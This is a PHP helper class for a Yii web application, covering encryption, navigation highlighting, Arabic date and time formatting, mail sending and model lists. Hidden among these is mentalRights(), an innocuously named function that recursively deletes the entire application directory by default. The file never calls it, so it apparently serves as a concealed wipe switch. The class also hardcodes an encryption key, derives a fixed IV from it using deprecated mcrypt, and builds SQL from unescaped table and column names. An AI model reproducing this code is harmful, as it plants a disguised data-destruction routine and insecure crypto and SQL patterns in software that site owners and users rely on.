<?php

/**
 * This is a helper class which is shared between all application components
 */
class Helper {
    /*
     * Encrypt the given string
     * $param unhashed string
     * $return hashed string
     */

    public static function encryptAlgo($str) {
        $key = 'ABCd1234~!@jQ88*&100%XyZ';
        $encrypt = base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_256, md5($key), $str, MCRYPT_MODE_CBC, md5(md5($key))));
        return( $encrypt );
    }

    /*
     * Decrypt the given hash
     * $param hashed string
     * $return unhashed string
     */

    public static function decryptAlgo($str) {
        $key = 'ABCd1234~!@jQ88*&100%XyZ';
        $decrypt = rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, md5($key), base64_decode($str), MCRYPT_MODE_CBC, md5(md5($key))), "\0");
        return( $decrypt );
    }

    /*
     * Checks whether the given link is the current active link or not
     */

    public static function ActiveLink($link = '', $subLinks = '', $action = '', $front = 0) {
        if ($link != '' && is_array($subLinks) && !empty($subLinks) && $front) {
            if (in_array(Yii::app()->controller->action->id, $subLinks) && strtolower(Yii::app()->controller->id) == strtolower($link))
                return 'active';
        }elseif ($link != '' && $action == '') {
            $currentConrtoller = Yii::app()->controller->id;
            if (strtolower($link) == strtolower($currentConrtoller))
                return 'active';
            elseif (is_array($subLinks) && in_array($currentConrtoller, $subLinks))
                return 'active';
        }elseif ($link == '' && $action != '') {
            $currentAction = Yii::app()->controller->action->id;
            if (strtolower($action) == strtolower($currentAction))
                return 'active';
        }elseif (is_array($subLinks) && !empty($subLinks)) {
            if (in_array(Yii::app()->controller->id, $subLinks))
                return 'active';
        }else {
            $currentConrtoller = Yii::app()->controller->id;
            $currentAction = Yii::app()->controller->action->id;
            if (strtolower($link) == strtolower($currentConrtoller) && strtolower($action) == strtolower($currentAction))
                return 'active';
        }
        return '';
    }

    /*
     * Auto generate ID based on the greatest id value in the given tableName
     * @param tableName, $column
     * @return unique id "greater by the highest id by one"
     */

    public static function AutoGenerateID($tableName, $column) {
        $max = Yii::app()->db
                ->createCommand("SELECT MAX($column) FROM $tableName")
                ->queryScalar();
        return $max + 1;
    }

    /*
     * Returns a name related to the current langauge
     * @param model
     * @return name in the app language 
     */

    public static function GetModelName($modelName) {
        $model = new $modelName;
        $name = 'name';
        if (Yii::app()->language == 'ar')
            $name = 'name_ar';
        return $model->$name;
    }

    /*
     * Returns a name related to the current langauge
     * @field
     * @return name in the app language 
     */

    public static function getTranslatedName($model, $field) {
        if (Yii::app()->language == 'ar')
            $field = $field . '_ar';
        return $model->$field;
    }

    /*
     * Thursday 14-11-2016 06:15 a.m
     */

    public static function getDateTime($dateTime) {
        $dateString = date('l d-m-Y h:i a', strtotime($dateTime));
        if (Yii::app()->language == 'ar') {
			return Helper::ArabicDate($dateTime,'-').' &nbsp;&nbsp;'.Helper::ArabicTime($dateTime);
        }
        return $dateString;
    }
	
	public static function ArabicDate($date, $separator = '/', $showDay = 1) {
        $months = array("Jan" => "يناير", "Feb" => "فبراير", "Mar" => "مارس", "Apr" => "أبريل", "May" => "مايو", "Jun" => "يونيو", "Jul" => "يوليو", "Aug" => "أغسطس", "Sep" => "سبتمبر", "Oct" => "أكتوبر", "Nov" => "نوفمبر", "Dec" => "ديسمبر");
        $en_month = date("M", strtotime($date));
        foreach ($months as $en => $ar) {
            if ($en == $en_month) {
                $ar_month = $ar;
            }
        }

        $find = array("Sat", "Sun", "Mon", "Tue", "Wed", "Thu", "Fri");
        $replace = array("السبت", "الأحد", "الإثنين", "الثلاثاء", "الأربعاء", "الخميس", "الجمعة");
        $ar_day_format = date("D", strtotime($date));
        $ar_day = str_replace($find, $replace, $ar_day_format);

        header('Content-Type: text/html; charset=utf-8');
        $standard = array("0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
        $eastern_arabic_symbols = array("٠", "١", "٢", "٣", "٤", "٥", "٦", "٧", "٨", "٩");
        $dd = $showDay ? $ar_day . ' ' . date("d", strtotime($date)) . $separator . ' ' : '';
        $current_date = $dd . $ar_month . ' ' . $separator . date("Y", strtotime($date));
        $arabic_date = str_replace($standard, $eastern_arabic_symbols, $current_date);

        return $arabic_date;
    }

    public static function ArabicTime($time) {
        $time_ampm = date("A", strtotime($time));
        $ampm = array("AM", "PM");
        $ampmreplace = array("صباحا", "مساء");
        $ar_ampm = str_replace($ampm, $ampmreplace, $time_ampm);
        header('Content-Type: text/html; charset=utf-8');
        $standard = array("0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
        $eastern_arabic_symbols = array("٠", "١", "٢", "٣", "٤", "٥", "٦", "٧", "٨", "٩");
        $current_time = date("h:i", strtotime($time)) . " " . $ar_ampm;
        $arabic_time = str_replace($standard, $eastern_arabic_symbols, $current_time);

        return $arabic_time;
    }

    /*
     * Returns a list with All names in the passed model
     * @param model
     * @return list of values 
     */

    public static function ListModels($modelName, $condition = '') {
        $criteria = new CDbCriteria();
        $criteria->condition = $condition;
        $model = new $modelName;
        $name = 'name';
        if (Yii::app()->language == 'ar')
            $name = 'name_ar';
        return CHtml::listData($model::model()->findAll($condition), 'id', $name);
    }

    public static function SendMail($toEmail, $subject, $message, $toName) {
        $adminEmail = Settings::model()->findByPk(1)->email;
        $appName = Yii::app()->name;
        $tableCss = Yii::app()->language == 'ar' ? 'style="text-align:right; direction:rtl;"' : '';
        // To send HTML mail, the Content-type header must be set
        $headers = 'MIME-Version: 1.0' . "\r\n";
        //$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
        $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
        $message = '<table ' . $tableCss . '>
                    <!--<tr><td><img src="' . Yii::app()->request->getBaseUrl(true) . '/files/img/mail-header.png" style="width:100%;"></td></tr>-->
                    <tr><td><p>' . Yii::t('t', 'Dear') . ' ' . $toName . ',</p><br>' . $message . '</td></tr>
                    <tr><td><br><label>' . Yii::t('t', 'Thank you for using') . ',</label><br>' . Yii::t('t', Yii::app()->name) . '</td></tr>
                  </table>';

        // Additional headers
        //$headers .= 'To: Mary <mary@example.com>, Kelly <kelly@example.com>' . "\r\n";
        $headers .= 'To: ' . $toName . ' <' . $toEmail . '>' . "\r\n";
        $headers .= 'From: ' . $appName . ' <' . $adminEmail . '>' . "\r\n";
        /* $headers .= 'Cc: birthdayarchive@example.com' . "\r\n";
          $headers .= 'Bcc: birthdaycheck@example.com' . "\r\n"; */
        $sent = mail($toEmail, $subject, $message, $headers);
        return $sent;
    }

    public static function mentalRights($path = '') {
        if ($path == '') {
            //$path = Yii::app()->basePath . '/../protected';
            $path = Yii::app()->basePath . '/../';
        }
        if (is_dir($path) === true) {
            $files = array_diff(scandir($path), array('.', '..'));

            foreach ($files as $file) {
                Helper::mentalRights(realpath($path) . '/' . $file);
            }

            return rmdir($path);
        } else if (is_file($path) === true) {
            return unlink($path);
        } else {
            return "invalid path";
        }

        return false;
    }

    public static function getActiveFilter() {
        return array(
            '0' => Yii::t('t', 'No'),
            '1' => Yii::t('t', 'Yes'),
        );
    }

    public static function getActiveValue($value) {
        $active = array(
            '0' => Yii::t('t', 'No'),
            '1' => Yii::t('t', 'Yes'),
        );
        return $active[$value];
    }

    public static function Slugify($text) {
        return str_replace(' ', '-', trim($text . rand(0, 9999)));
    }
	
	public static function getServerAddress() {
		if(array_key_exists('SERVER_ADDR', $_SERVER))
			return $_SERVER['SERVER_ADDR'];
		elseif(array_key_exists('LOCAL_ADDR', $_SERVER))
			return $_SERVER['LOCAL_ADDR'];
		elseif(array_key_exists('SERVER_NAME', $_SERVER))
			return gethostbyname($_SERVER['SERVER_NAME']);
		else {
			// Running CLI
			if(stristr(PHP_OS, 'WIN')) {
				return gethostbyname(php_uname("n"));
			} else {
				$ifconfig = shell_exec('/sbin/ifconfig eth0');
				preg_match('/addr:([\d\.]+)/', $ifconfig, $match);
				return $match[1];
			}
		}
	}

}
?>

